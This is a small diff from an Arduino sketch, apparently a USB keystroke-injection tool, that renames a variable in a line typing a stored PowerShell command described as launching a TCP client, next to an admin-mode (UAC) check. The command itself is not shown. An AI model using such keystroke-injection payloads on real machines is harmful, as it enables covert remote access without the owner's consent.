@@ -97,7 +97,7 @@ void setup() {
   delay(iMs);
 
   // Launch the TCP Client 
-  Keyboard.println(sPowershellCmd);
+  Keyboard.println(sPowerShellCmd);
 
   // If admin mode
   if (bUAC) {
